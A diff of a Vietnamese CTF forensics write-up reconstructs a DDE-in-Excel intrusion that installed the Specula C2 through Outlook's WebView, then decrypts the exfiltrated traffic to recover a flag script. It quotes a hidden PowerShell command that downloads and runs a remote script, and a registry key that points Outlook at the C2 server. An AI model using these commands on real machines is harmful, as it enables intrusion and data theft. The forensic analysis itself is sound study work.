@@ -2,7 +2,7 @@
 title = 'Lookout — Write-up'
 date = '2026-06-13T23:00:00+07:00'
 draft = false
-tags = ['forensics', 'bkctf', 'BKCTF2026', 'malware', 'c2', 'specula', 'outlook', 'windows']
+tags = ['forensics', 'BKCTF2026', 'malware', 'c2', 'specula', 'outlook', 'windows']
 categories = ['CTF Write-ups', 'Forensics']
 +++
 
@@ -19,271 +19,185 @@ categories = ['CTF Write-ups', 'Forensics']
 **File đính kèm:** `chall.ad1` (2.2 GB — AccessData Logical Image)  
 **Tải về:** [chall.ad1 — OneDrive](https://1drv.ms/u/c/2f661437c52d8a10/IQAkxaS_vTNwQqKoi0vLrxCKAVn2vWZRkgYDzcLD1hlrsOQ?e=U1klCW)
 
-**Mục tiêu:** Phân tích ảnh đĩa pháp y để tìm Flag bị ẩn giấu.
-
 ---
 
-## Tổng quan chuỗi tấn công
+## Tổng quan
 
-![**Hình 1.** Toàn cảnh chuỗi tấn công từ file ảnh đĩa đến lúc lấy Flag.](/images/write-ups/bkctf-2026-lookout/fig1_attack_chain.png)
+Bài này mô phỏng một kịch bản tấn công có chủ đích hoàn chỉnh: kẻ tấn công gửi file `report.xlsx` độc hại qua email, lợi dụng tính năng của Office để cài cắm C2 framework vào Outlook, rồi âm thầm thu thập và mã hóa dữ liệu trước khi xóa sạch dấu vết. Nhiệm vụ là tái dựng lại toàn bộ chuỗi đó từ một file ảnh đĩa duy nhất.
 
-Khi nhìn tổng thể, đây là một bài về phân tích mã độc thực tế: kẻ tấn công gửi file `report.xlsx` qua email → nạn nhân mở file → mã độc kích hoạt Specula C2 Framework qua Outlook → hacker thu thập dữ liệu mã hóa → xóa dấu vết. Nhiệm vụ của mình là tái dựng lại toàn bộ chuỗi đó từ một file ảnh đĩa duy nhất.
+```mermaid
+flowchart LR
+    A[chall.ad1] --> B[Dissect\ntarget-shell]
+    B --> C[OST Email\nAttachment]
+    C --> D[Excel Autosave\n.xlsb]
+    D --> E[DDE Attack\nexternalLink1.bin]
+    E --> F[PowerShell\nFileless Loader]
+    F --> G[Specula C2\n192.168.1.189]
+    G --> H[XOR Encrypted\nPayloads]
+    H --> I[flag.py\nRC4 Decrypt]
+    I --> J["BKISC{...}"]
 
----
-
-## Bước 1 — Tiếp cận file ảnh đĩa (và chuỗi thất bại ban đầu)
-
-Định dạng `.ad1` là **AccessData Logical Image** — định dạng ảnh đĩa độc quyền của hãng AccessData (nay là Exterro), thường dùng trong pháp y doanh nghiệp. Khác với `.dd` hay `.E01`, file `.ad1` không phải raw image — nó lưu trữ file theo cấu trúc logic có container riêng, nên hầu hết công cụ Linux thông thường không đọc được trực tiếp.
-
-### Thất bại 1: FTK Imager
-
-Công cụ "chính thống" để mở `.ad1` là FTK Imager. Trên Windows không có vấn đề gì, nhưng FTK Imager cho Linux đã bị AccessData ngừng hỗ trợ từ lâu. Mình thử dùng Wine để chạy phiên bản Windows nhưng các driver pháp y không tương thích.
-
-### Thất bại 2: Autopsy
-
-Autopsy (phiên bản Linux) hỗ trợ mở `.ad1` qua plugin của Sleuth Kit. Mình cài và chạy:
-
-```bash
-autopsy
+    style A fill:#1e293b,color:#94a3b8
+    style J fill:#166534,color:#bbf7d0
+    style G fill:#7c2d12,color:#fed7aa
 ```
 
-Autopsy khởi động nhưng ngay lập tức văng lỗi:
+---
+
+## Bước 1 — Mở file ảnh đĩa
+
+Thứ đầu tiên cần giải quyết là làm sao đọc được file `chall.ad1`. Định dạng `.ad1` là **AccessData Logical Image** — một định dạng container độc quyền của hãng AccessData, không phải raw image như `.dd` hay `.E01`. Hầu hết các công cụ pháp y phổ biến trên Linux đều không hỗ trợ trực tiếp.
+
+Mình đã thử lần lượt các công cụ trước khi tìm ra giải pháp đúng:
+
+**FTK Imager** là công cụ chính thống nhất để mở định dạng này, nhưng phiên bản Linux đã bị ngừng hỗ trợ. Chạy qua Wine cũng thất bại vì các driver pháp y không tương thích với môi trường emulation.
+
+**Autopsy** về lý thuyết hỗ trợ `.ad1` qua plugin Sleuth Kit, nhưng chưa khởi động được đã gặp lỗi Perl Taint Mode:
+
 ```
 Insecure dependency in open while running with -T switch at /usr/bin/autopsy line 45.
 ```
 
-Đây là lỗi **Perl Taint Mode** (`-T` flag) — một cơ chế bảo mật của Perl kiểm tra biến môi trường "ô nhiễm". Trên Parrot OS, biến `$PATH` chứa các thư mục người dùng không được Taint mode chấp nhận.
+Lỗi này xảy ra vì trên Parrot OS, biến `$PATH` chứa các thư mục người dùng — điều mà cơ chế bảo mật `-T` của Perl coi là "ô nhiễm". Sửa shebang từ `#!/usr/bin/perl -wT` thành `#!/usr/bin/perl -w` giúp Autopsy khởi động, nhưng kết quả vẫn không dùng được: trình duyệt file chỉ hiện raw bytes của container, không giải mã được cấu trúc NTFS bên trong.
 
-Workaround: Sửa shebang của script Autopsy để bỏ flag `-T`:
+**libad1** đi kèm trong gói `AD1Tools` của challenge cũng được thử. Sau khi vượt qua lỗi thiếu thư viện FUSE, công cụ này biên dịch thành công — nhưng lại segfault ngay khi xử lý file, có thể do version format không khớp.
 
-```bash
-sudo nano /usr/bin/autopsy
-# Dòng 1: #!/usr/bin/perl -wT  →  #!/usr/bin/perl -w
-```
+**binwalk** chạy thẳng lên `chall.ad1` chỉ cho kết quả hàng trăm false positive (Zlib headers, JPEG signature...) vì nó không hiểu cấu trúc của container AD1.
 
-Autopsy mở được, nhưng khi nạp file `.ad1` vào thì trình duyệt file không hiển thị cấu trúc bên trong — chỉ thấy raw data của container, không phân tích được hệ thống file NTFS.
-
-### Thất bại 3: Biên dịch libad1 từ nguồn
-
-Trong kho `AD1Tools` đi kèm challenge, có mã nguồn C của thư viện `libad1` với file `ad1extract`. Mình thử biên dịch:
-
-```bash
-cd AD1-tools/AD1Tools/libad1/
-./configure && make
-```
-
-```
-configure: error: Package requirements (fuse >= 2.6) were not met:
-No package 'fuse' found
-```
-
-Cài `libfuse-dev` xong, biên dịch được — nhưng khi chạy thì segfault ngay khi xử lý file `.ad1` này, có thể do version format không tương thích.
-
-### Thất bại 4: binwalk trực tiếp lên AD1
-
-```bash
-binwalk chall.ad1
-```
-
-Trả về hàng trăm false positive — Zlib headers, JPEG fragments đủ loại — vì `binwalk` không hiểu cấu trúc container AD1, nó chỉ quét signature mù.
-
-### Giải pháp: Dissect Framework
-
-Sau hồi mò mẫm, mình tìm ra **Dissect** — framework pháp y Python mã nguồn mở của Fox-IT, hỗ trợ nhiều định dạng ảnh đĩa kể cả AD1.
+Sau khi thử hết các hướng trên, mình tìm ra **Dissect** — framework pháp y Python mã nguồn mở của Fox-IT. Điểm khác biệt của Dissect là nó xử lý đúng cấu trúc container AD1 và parse cả hệ thống file NTFS bên trong.
 
 ```bash
 pip install dissect
 target-shell chall.ad1
 ```
 
-Dissect nhận ra NTFS bên trong container AD1 và mở một shell tương tác. Cú pháp của nó khá lạ — dùng đường dẫn Windows thay vì Linux:
+Dissect mở một shell tương tác với đường dẫn kiểu Windows:
 
 ```
-chall.ad1:/> ls
-\/:NONAME [NTFS]
-
 chall.ad1:/> cd \/:NONAME\ [NTFS]/[root]/Users/BKISC/
-chall.ad1:/\/:NONAME [NTFS]/[root]/Users/BKISC> ls
-AppData/
-Desktop/
-Documents/
-Downloads/
+chall.ad1:/...> ls
+AppData/  Desktop/  Documents/  Downloads/
 ```
 
-### Thất bại khi cố xuất file
-
-Mình tìm thấy file OST và muốn copy ra ngoài:
-
-```bash
-chall.ad1:/...> save nguyencocay986@gmail.com.ost /home/user/ost_file.ost
-save: No such file or directory
-```
-
-Lệnh `save` không tồn tại. Thử `cat` redirect cũng không ra file. Vậy là `target-shell` không có lệnh copy trực tiếp.
-
-### Python nhúng trong target-shell
-
-`target-shell` có lệnh `python` mở một IPython REPL với biến `t` (target object) được nạp sẵn. Đây là cách duy nhất để trích xuất file.
-
-Lần đầu thử, mình dùng sai tên biến:
+Bước tiếp theo là trích xuất file. Lệnh shell thông thường như `save` hay `cat >` không hoạt động trong `target-shell`. Thay vào đó, `target-shell` cung cấp một IPython REPL với biến `t` là target object đã được nạp sẵn — và đây mới là cách đúng để đọc/ghi file.
 
 ```python
 # Bên trong target-shell > python
-for p in fs.cwd().iterdir():   # ← NameError: name 'fs' is not defined
-    ...
-```
-
-API đúng phải là `t.fs`:
-
-```python
-# Đúng: object target là 't', filesystem là 't.fs'
-for p in t.fs.path("/").rglob("*"):
-    print(p)
-```
-
-Mình dump toàn bộ danh sách file ra ngoài để xem toàn cảnh:
-
-```python
-with open("/home/user/danh_sach_file_dissect.txt", "w") as out:
+# Dump toàn bộ cây thư mục để khảo sát
+with open("/home/user/file_list.txt", "w") as out:
     for p in t.fs.path("/").rglob("*"):
         out.write(str(p) + "\n")
 ```
 
-Duyệt qua file đó, tìm ra các artifact quan trọng:
+Đọc file đó, mình xác định được những artifact đáng chú ý:
 
 ```
-.../Recent/report.xlsx.lnk          ← nạn nhân đã mở report.xlsx gần đây
-.../Recent/report.zip.lnk           ← và report.zip
-.../Downloads/report.zip            ← file ZIP gốc vẫn còn
-.../Outlook/nguyencocay986@gmail.com.ost  ← hộp thư Outlook
+.../Recent/report.xlsx.lnk       ← nạn nhân đã mở report.xlsx gần đây
+.../Recent/report.zip.lnk        ← và cả report.zip
+.../Downloads/report.zip         ← file ZIP gốc vẫn còn trong Downloads
+.../Outlook/nguyencocay986@gmail.com.ost  ← toàn bộ hộp thư Outlook
 ```
 
-Hai file `.lnk` trong `Recent` xác nhận nạn nhân đã mở cả hai file đó. Tiếp theo mình trích xuất file OST:
+File `.lnk` trong thư mục `Recent` là artifact Windows tự tạo mỗi khi người dùng mở một file — và chúng vẫn tồn tại ngay cả khi file gốc đã bị xóa. Hai shortcut này xác nhận nạn nhân đã mở cả `report.xlsx` lẫn `report.zip`. Hộp thư Outlook (file `.ost`) là nơi lưu trữ toàn bộ email nội bộ — và nhiều khả năng chứa email gốc đính kèm file độc hại.
+
+Mình trích xuất file OST ra ngoài:
 
 ```python
-ost_path = t.fs.path(
+ost = t.fs.path(
     "/\\/:NONAME [NTFS]/[root]/Users/BKISC/AppData/Local/Microsoft/Outlook/"
     "nguyencocay986@gmail.com.ost"
 )
 with open("/home/user/nguyencocay986.ost", "wb") as f:
-    f.write(ost_path.open().read())
-print("Trích xuất OST thành công:", ost_path.stat().st_size, "bytes")
+    f.write(ost.open().read())
+```
 
 ---
 
-## Bước 2 — Phân tích hộp thư OST
+## Bước 2 — Phân tích hộp thư Outlook
 
-Mình trích xuất file `.ost` ra ngoài và dùng `binwalk` để quét cấu trúc bên trong:
+Với file OST trong tay, mình dùng `binwalk` để tìm các file nhúng bên trong:
 
 ```bash
 binwalk nguyencocay986@gmail.com.ost
 ```
 
-Kết quả phát hiện một file ZIP bị mã hóa:
+Kết quả có một file ZIP mã hóa:
 
 ```
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-899584        0xDBA00         Zip archive data, encrypted at least v2.0 to extract,
-                              compressed size: 81738, uncompressed size: 84942,
-                              name: report.xlsx
+899584   0xDBA00   Zip archive data, encrypted, name: report.xlsx
 ```
 
-Có một file `report.xlsx` bị mã hóa bằng mật khẩu, nằm trong email. Mình thử trích xuất và bẻ khóa mật khẩu:
+Phản xạ đầu tiên là thử trích xuất và bẻ mật khẩu:
 
 ```bash
 binwalk -e nguyencocay986@gmail.com.ost
-zip2john DBA00.zip > zip_hash.txt
-john --wordlist=rockyou.txt zip_hash.txt
+zip2john DBA00.zip > hash.txt
+john --wordlist=rockyou.txt hash.txt
 ```
 
-### Bẫy đầu tiên: File ZIP bị hỏng cấu trúc
+`zip2john` trả về lỗi ngay:
 
-`zip2john` trả về lỗi:
 ```
 Did not find End Of Central Directory.
 ```
 
-**Tại sao?** File OST lưu dữ liệu theo Block không liên tục (giống FAT cluster). `binwalk` không hiểu cấu trúc này — nó chỉ tìm thấy byte đầu của file ZIP rồi chép thẳng 15MB dữ liệu liên tiếp, bao gồm cả rác từ các Block khác của OST. Kết quả là cấu trúc **End Of Central Directory (EOCD)** không khớp, khiến mọi công cụ ZIP đều từ chối xử lý.
+File ZIP bị hỏng. Nguyên nhân: file OST không lưu dữ liệu liên tục theo byte — nó phân bổ dữ liệu thành các block không liền kề trên đĩa, tương tự cách FAT quản lý cluster. `binwalk` không hiểu cấu trúc này, nên khi gặp signature của ZIP, nó chép thẳng một đoạn byte tuyến tính — bao gồm cả dữ liệu của các block không liên quan. Kết quả là cấu trúc **End Of Central Directory (EOCD)** — phần bắt buộc ở cuối mọi file ZIP hợp lệ — hoàn toàn không khớp.
 
-> **Bài học:** Khi dùng `binwalk` để trích xuất dữ liệu từ các định dạng container phức tạp (OST, PST, VHD...), kết quả trích xuất cần được xác minh tính toàn vẹn trước khi dùng.
+Đây là giới hạn cơ bản của `binwalk`: nó hiệu quả với raw image, nhưng không dùng được để trích xuất dữ liệu từ các container có cấu trúc phân mảnh như OST hay PST.
 
 ---
 
-## Bước 3 — Lách qua mật khẩu bằng Autosave
+## Bước 3 — Bỏ qua mật khẩu bằng Excel Autosave
 
-Thay vì cố sửa file ZIP bị hỏng, mình chuyển hướng suy nghĩ: *Nếu nạn nhân đã mở được file này và nhập mật khẩu, thì Office có thể đã lưu bản nháp không mã hóa ở đâu đó.*
+Thay vì cố gắng sửa file ZIP bị hỏng, mình thay đổi góc tiếp cận: *nếu nạn nhân đã mở được file này và nhập mật khẩu, thì bản thân Microsoft Office rất có thể đã tự lưu một bản nháp không mã hóa ở đâu đó trong hệ thống.*
 
-Microsoft Office có tính năng **Autosave** — khi người dùng mở và chỉnh sửa file, Office tự tạo bản sao tạm trong AppData mà **không áp dụng mật khẩu** của file gốc. Đây là điểm yếu quan trọng về mặt pháp y.
+Đây là điểm yếu pháp y ít được chú ý của tính năng **Autosave**: khi người dùng mở một file có mật khẩu và bắt đầu làm việc, Excel định kỳ lưu bản nháp phục hồi vào thư mục riêng trong `AppData`. Bản nháp này **không kế thừa mật khẩu** của file gốc — nó chỉ là dump trực tiếp của dữ liệu đang làm việc trong bộ nhớ.
 
 Quay lại `target-shell`, mình tìm kiếm trong thư mục Autosave của Excel:
 
 ```
-chall.ad1:/> cd [root]/Users/BKISC/AppData/Roaming/Microsoft/Excel/report312080493576797376/
-chall.ad1:/...> ls
-
-report((Unsaved-312080580921779168)).xlsb
-report((Unsaved-312080580921779168)).xlsb.FileSlack
-report.xlsx.lnk
-report.xlsx.lnk.FileSlack
+.../AppData/Roaming/Microsoft/Excel/report312080493576797376/
+  report((Unsaved-312080580921779168)).xlsb      ← bản Autosave
+  report((Unsaved-312080580921779168)).xlsb.FileSlack
 ```
 
-Có một file Autosave: `report((Unsaved-312080580921779168)).xlsb`. Mình dùng Python nhúng của `target-shell` để trích xuất:
+File `.xlsb` (Excel Binary Workbook) — đây chính xác là bản nháp mình cần. Trích xuất ra:
 
 ```python
-# Bên trong target-shell > python
 for p in t.fs.path("/").rglob("*Unsaved*"):
     if "report" in p.name and "xlsb" in p.name and "FileSlack" not in p.name:
         with open("/home/user/report_autosave.xlsb", "wb") as f:
             f.write(p.open().read())
-        print("Trích xuất thành công!")
+        print("OK:", p.name)
 ```
 
 ---
 
-## Bước 4 — Phân tích XLSB và kỹ thuật DDE Attack
+## Bước 4 — Phát hiện DDE Attack trong file Excel
 
-File `.xlsb` (Excel Binary Workbook) thực chất là một ZIP chứa các file nhị phân. Mình giải nén:
+File `.xlsb` thực chất là một ZIP chứa các file nhị phân. Giải nén ra:
 
 ```bash
-unzip report_autosave.xlsb -d mo_xe_excel/
+unzip report_autosave.xlsb -d excel_extracted/
 ```
 
-Cấu trúc bên trong:
+Điều đáng chú ý đầu tiên: **không có `vbaProject.bin`** — tức là file này không chứa Macro VBA. Đây là chỉ dấu quan trọng vì các công cụ diệt virus thường tập trung quét Macro, nên việc không có Macro không có nghĩa là file lành.
 
-```
-mo_xe_excel/
-├── [Content_Types].xml
-├── xl/
-│   ├── workbook.bin
-│   ├── worksheets/sheet1.bin
-│   ├── sharedStrings.bin
-│   ├── externalLinks/
-│   │   └── externalLink1.bin    ← ĐÂY RỒI
-│   └── media/image1.jpeg
-└── ...
-```
+Nằm trong thư mục `xl/externalLinks/` có file `externalLink1.bin`. Tên "externalLink" là tính năng hợp lệ của Excel dùng để nhúng liên kết tới nguồn dữ liệu bên ngoài — nhưng nó cũng là vector của kỹ thuật **DDE (Dynamic Data Exchange) Attack**, cho phép nhúng lệnh shell trực tiếp.
 
-### Bẫy thứ hai: Không có Macro
-
-Khi kiểm tra, file này **không có** `vbaProject.bin` (file chứa Macro VBA). Đây là cách mã độc tránh bị phát hiện bởi các công cụ diệt virus thông thường, vốn chủ yếu quét Macro.
-
-Thay vào đó, payload nằm trong `externalLink1.bin`. Mình viết script đọc các chuỗi UTF-16 từ file này (vì Office lưu chuỗi text dạng Unicode):
+Mình đọc chuỗi Unicode từ file này (Office lưu text dạng UTF-16LE):
 
 ```python
-import struct
-
-with open("mo_xe_excel/xl/externalLinks/externalLink1.bin", "rb") as f:
+with open("excel_extracted/xl/externalLinks/externalLink1.bin", "rb") as f:
     data = f.read()
 
-# Trích xuất chuỗi UTF-16LE
 decoded = data.decode('utf-16le', errors='ignore')
 for line in decoded.split('\x00'):
     if len(line) > 10:
         print(line)
 ```
 
-Kết quả:
+Output:
 
 ```
 cmd.exe /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(
@@ -291,21 +205,17 @@ cmd.exe /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).Downloa
 StdDocumentName
 ```
 
-Đây là kỹ thuật **DDE (Dynamic Data Exchange) Attack**: Office cho phép file nhúng "liên kết ngoài" tới các nguồn dữ liệu bên ngoài. Kẻ tấn công đã lợi dụng tính năng này để chạy lệnh shell khi file được mở. Lệnh PowerShell sẽ tải và thực thi script `report.txt` từ IP `192.168.1.189:1704` trực tiếp trên RAM.
+Khi nạn nhân mở file Excel này, Office tự động resolve "liên kết ngoài" và thực thi lệnh trên. PowerShell tải script `report.txt` từ IP `192.168.1.189:1704` rồi chạy thẳng trên RAM mà không ghi ra đĩa — kỹ thuật thường gọi là **Fileless Malware**. Không có gì để tìm trên đĩa ở bước này.
 
 ---
 
-## Bước 5 — Trích xuất Event Log từ Zlib Chunks
+## Bước 5 — Đào dữ liệu từ Zlib chunks trong AD1
 
-Để biết nội dung `report.txt` đã làm gì, mình cần xem **PowerShell Script Block Logging** — tính năng của Windows ghi lại mọi đoạn mã PowerShell được thực thi (Event ID 4104, lưu trong Event Log).
+Để biết `report.txt` đã làm gì khi được thực thi, mình cần tìm **PowerShell Script Block Logging** — tính năng Windows ghi lại toàn bộ code PowerShell được chạy vào Event Log (Event ID 4104).
 
-### Bẫy thứ ba: Dữ liệu bị nén Zlib
+Vấn đề: file `.ad1` không lưu dữ liệu dạng thô. Toàn bộ nội dung bên trong được nén bằng **Zlib** trước khi đóng gói vào container. Điều này có nghĩa là `grep`, `strings`, hay bất kỳ công cụ text-search nào chạy trực tiếp trên `chall.ad1` đều sẽ không tìm thấy gì — kể cả khi dữ liệu cần tìm đang nằm ngay đó.
 
-File `.ad1` không lưu dữ liệu dạng thô. Nó nén toàn bộ block dữ liệu bằng **Zlib** trước khi ghi vào file ảnh. Vì vậy, chạy `grep` hay `strings` trực tiếp trên `chall.ad1` sẽ không tìm thấy gì — dữ liệu đã bị nén và không đọc được dạng text.
-
-![**Hình 3.** Cách quét Zlib Chunk để tìm Event Log ẩn bên trong file ảnh đĩa.](/images/write-ups/bkctf-2026-lookout/fig3_zlib_scan.png)
-
-Giải pháp: Mình viết script Python dùng `mmap` để đọc file 2.2GB không bị tràn RAM, rồi tìm các magic byte của Zlib (`\x78\x9C`, `\x78\xDA`, `\x78\x01`) và thử giải nén từng khối:
+Giải pháp là duyệt thủ công toàn bộ file 2.2GB, tìm mọi vị trí có **Zlib magic byte** (`\x78\x9C`, `\x78\xDA`, `\x78\x01`, `\x78\x5E`) rồi thử giải nén từng khối. Để đọc file 2.2GB mà không bị tràn RAM, mình dùng `mmap` — kỹ thuật ánh xạ file vào bộ nhớ ảo:
 
 ```python
 import mmap, re, zlib
@@ -313,93 +223,90 @@ import mmap, re, zlib
 with open("chall.ad1", "rb") as f:
     mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
 
-target_utf16 = "192.168.1.189".encode("utf-16le")
+target = "192.168.1.189".encode("utf-16le")
 
 for match in re.finditer(b'\x78[\x01\x5e\x9c\xda]', mm):
     idx = match.start()
     try:
-        d = zlib.decompressobj()
-        decomp = d.decompress(mm[idx:idx+200000])
-        if target_utf16 in decomp:
-            print(f"[+] TÌM THẤY tại offset {hex(idx)}")
-            # In ngữ cảnh UTF-16 xung quanh
-            pos = decomp.find(target_utf16)
+        decomp = zlib.decompressobj().decompress(mm[idx:idx+200000])
+        if target in decomp:
+            pos = decomp.find(target)
             ctx = decomp[max(0,pos-200):pos+500].decode('utf-16le', 'ignore')
-            print(ctx)
+            print(f"[offset {hex(idx)}]\n{ctx}\n")
     except Exception:
         pass
 ```
 
-### Kết quả
+Script chạy mất khoảng 10–15 phút để quét hết 2.2GB. Kết quả trả về hai khối quan trọng.
 
-Script tìm ra nhiều khối dữ liệu quan trọng. Quan trọng nhất là đoạn nhật ký từ Script Block Logging và HTTP request của mã độc:
+**Khối thứ nhất** (offset `0x5d48333c`) chứa Event Log của PowerShell Script Block Logging. Từ đây mình đọc được toàn bộ lệnh đã chạy, và quan trọng hơn, một chuỗi xuất hiện trong kết nối HTTP:
 
 ```
-[+] TÌM THẤY tại khối 0x5d48333c:
-  HostApplication=powershell.exe -w hidden $e=(New-Object System.Net.WebClient)
-  .DownloadString("http://192.168.1.189:1704/report.txt");IEX $e
-
 o4WlfbKbx1xik1TgTQGeOQ||http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ,...
-
-[+] TÌM THẤY tại khối 0x5624416e:
-  User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64;
-              Trident/7.0; Specula;
-  Post: 192.168.1.189:8386
-  _"3F55250908166B24175D1C0C190B74246E7E12162A231C1B15272F31084D3C54...
 ```
+
+**Khối thứ hai** (offset `0x5624416e`) chứa HTTP traffic từ máy nạn nhân gửi tới C2 server, bao gồm User-Agent:
+
+```
+User-Agent: Mozilla/5.0 ... Trident/7.0; Specula;
+Post: 192.168.1.189:8386
+3F55250908166B24175D1C0C190B74246E7E12162A231C1B15272F31084D3C54...
+```
+
+Hai từ khóa then chốt: **`Specula`** trong User-Agent, và chuỗi hex dài phía sau.
 
 ---
 
-## Bước 6 — Nhận diện Specula C2 Framework
+## Bước 6 — Phân tích Specula C2 Framework
 
-Từ User-Agent có chữ `Specula`, mình tra cứu và xác nhận: đây là **Specula** — một C2 (Command & Control) Framework được phát triển bởi TrustedSec, chuyên khai thác tính năng **Home Page** của Outlook.
+Tra cứu từ khóa `Specula`, mình xác định đây là **Specula C2 Framework** — một công cụ Command & Control do TrustedSec phát triển, khai thác tính năng **Home Page (WebView)** của Outlook.
 
-![**Hình 2.** Cơ chế hoạt động của Specula C2: biến Outlook thành một Beacon giao tiếp với máy chủ.](/images/write-ups/bkctf-2026-lookout/fig2_specula_c2.png)
-
-### Cơ chế hoạt động
-
-Specula hoạt động bằng cách ghi đè Registry:
+Cơ chế hoạt động như sau: Specula ghi một URL vào Registry:
 
 ```
 HKCU\Software\Microsoft\Office\16.0\Outlook\Webview\Inbox
   URL = http://192.168.1.189:8386/plugin/search/
 ```
 
-Khi Outlook khởi động, nó tự động tải trang web từ URL trên vào khung WebView (một tính năng cũ của Outlook). Trang web này chứa VBScript độc hại hoạt động như một Beacon: định kỳ gửi thông tin về máy chủ C2 và nhận lệnh để thực thi.
+Mỗi lần Outlook khởi động, nó tự động load trang web từ URL trên vào khung WebView bên trong giao diện. Trang đó chứa VBScript độc hại đóng vai trò Beacon — định kỳ kết nối về C2 server để nhận lệnh và gửi kết quả về. Từ góc nhìn của nạn nhân, Outlook trông hoàn toàn bình thường.
 
-### Dữ liệu truyền đi
+```mermaid
+sequenceDiagram
+    participant V as Máy nạn nhân
+    participant O as Outlook WebView
+    participant C as C2 Server :8386
 
-Dữ liệu mà Specula gửi về máy chủ được mã hóa bằng XOR, định dạng Hex. Nhiều chuỗi Hex xuất hiện trong log:
-
+    O->>C: GET /plugin/search/ (beacon)
+    C-->>O: VBScript payload
+    O->>V: Thực thi lệnh (liệt kê file, đọc nội dung...)
+    V-->>O: Kết quả lệnh
+    O->>C: POST /css/... (dữ liệu XOR-encrypted)
+    C-->>O: Lệnh tiếp theo
 ```
-3F55250908166B24175D1C0C190B74246E7E12162A231C395D2A5C42085824...
-4C141D1915166B100D5F581D035474043B3522453B3E4F5332184616230758...
-2B513B0912076B04115D1D534B726E3B012222173C0D2D7F1E3F253E0F070B...
-```
 
-Điều quan trọng: trong log cũng xuất hiện **Agent ID** của Specula ở dạng plaintext:
+Dữ liệu Specula gửi về server được mã hóa XOR và encode dạng Hex. Điều quan trọng: trong log mình cũng tìm thấy **Agent ID** của Specula tồn tại dưới dạng plaintext:
+
 ```
 o4WlfbKbx1xik1TgTQGeOQ
 ```
 
-Trong giao thức của Specula, Agent ID này đồng thời là **khóa XOR** để mã hóa/giải mã dữ liệu truyền tải.
+Nghiên cứu mã nguồn Specula cho thấy Agent ID chính là **khóa XOR** dùng để mã hóa toàn bộ traffic. Đây là mắt xích quyết định: có khóa là có thể giải mã mọi payload mà C2 đã thu thập.
 
 ---
 
-## Bước 7 — Giải mã toàn bộ Payload
+## Bước 7 — Giải mã payload và khôi phục flag.py
 
-![**Hình 4.** Quy trình giải mã XOR và RC4 để thu được Flag cuối cùng.](/images/write-ups/bkctf-2026-lookout/fig4_xor_decrypt.png)
-
-Biết khóa, mình viết script quét toàn bộ file ảnh đĩa, tìm mọi chuỗi Hex dài (≥ 50 ký tự), giải mã XOR và lọc những nội dung có nghĩa:
+Với khóa `o4WlfbKbx1xik1TgTQGeOQ` trong tay, mình quét lại toàn bộ file ảnh đĩa một lần nữa — lần này tìm mọi chuỗi Hex dài (≥ 50 ký tự) trong các Zlib chunk, thử giải mã XOR, và lọc ra những nội dung có nghĩa:
 
 ```python
 import mmap, re, zlib, binascii
 
 KEY = b"o4WlfbKbx1xik1TgTQGeOQ"
 
-def xor_decrypt(hex_str, key):
+def xor_dec(hex_str):
+    if len(hex_str) % 2: hex_str = hex_str[:-1]
     data = binascii.unhexlify(hex_str)
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))
 
 with open("chall.ad1", "rb") as f:
     mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
@@ -409,41 +316,31 @@ for match in re.finditer(b'\x78[\x01\x5e\x9c\xda]', mm):
     idx = match.start()
     try:
         decomp = zlib.decompressobj().decompress(mm[idx:idx+200000])
-        for hex_match in re.finditer(b'[0-9A-Fa-f]{50,}', decomp):
-            hex_str = hex_match.group(0).decode()
-            if hex_str in seen:
-                continue
-            seen.add(hex_str)
-            if len(hex_str) % 2 != 0:
-                hex_str = hex_str[:-1]
+        for hm in re.finditer(b'[0-9A-Fa-f]{50,}', decomp):
+            hs = hm.group(0).decode()
+            if hs in seen: continue
+            seen.add(hs)
             try:
-                plain = xor_decrypt(hex_str, KEY).decode('ascii', 'ignore')
-                if any(kw in plain for kw in ["def RC4", "flag", "print", "Desktop"]):
-                    print(f"--- PAYLOAD {len(hex_str)} ký tự ---")
-                    print(plain[:500])
-                    print()
-            except Exception:
-                pass
-    except Exception:
-        pass
+                plain = xor_dec(hs).decode('ascii', 'ignore')
+                if any(k in plain for k in ["def RC4", "Desktop", "Delete file"]):
+                    print(f"--- {len(hs)} chars ---\n{plain[:600]}\n")
+            except: pass
+    except: pass
 ```
 
-### Kết quả giải mã
+Script tìm ra ba payload có nghĩa, tái dựng lại toàn bộ timeline của cuộc tấn công:
 
-Ba payload có nghĩa được tìm thấy:
+**Payload 1** — Kết quả lệnh liệt kê Desktop (Specula đã gửi về C2 trước khi xóa):
 
-**Payload 1 — Danh sách file trên Desktop:**
 ```
 Parent Folder: C:/Users/BKISC/Desktop
-F: C:\Users\BKISC\Desktop\desktop.ini - Size: 0mb - LastModified: 07/04/2024 19:05:48
-F: C:\Users\BKISC\Desktop\flag.py     - Size: 0mb - LastModified: 25/07/2025 15:41:41
+F: C:\Users\BKISC\Desktop\flag.py     - LastModified: 25/07/2025 15:41:41
 F: C:\Users\BKISC\Desktop\Obsidian.lnk
-D: C:\Users\BKISC\Desktop\PS_Transcripts - LastModified: 01/10/2025 02:11:40
+D: C:\Users\BKISC\Desktop\PS_Transcripts
 ```
 
-Có một file `flag.py` trên Desktop!
+**Payload 2** — Nội dung của `flag.py` mà Specula đọc và gửi về trước khi ra lệnh xóa:
 
-**Payload 2 — Nội dung của `flag.py` (được gửi về C2 trước khi xóa):**
 ```python
 # Just run the code to get the flag lol
 
@@ -453,7 +350,6 @@ def RC4(key : bytes, plaintext : bytes):
     for i in range(256):
         j = (j + S[i] + key[i % len(key)]) % 256
         S[i], S[j] = S[j], S[i]
-
     i = j = 0
     ciphertext = []
     for char in plaintext:
@@ -461,8 +357,7 @@ def RC4(key : bytes, plaintext : bytes):
         j = (j + S[i]) % 256
         S[i], S[j] = S[j], S[i]
         t = (S[i] + S[j]) % 256
-        k = S[t]
-        ciphertext.append(char ^ k)
+        ciphertext.append(char ^ S[t])
     return bytes(ciphertext)
 
 key = b"lookalikechicken"
@@ -470,45 +365,40 @@ plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\x
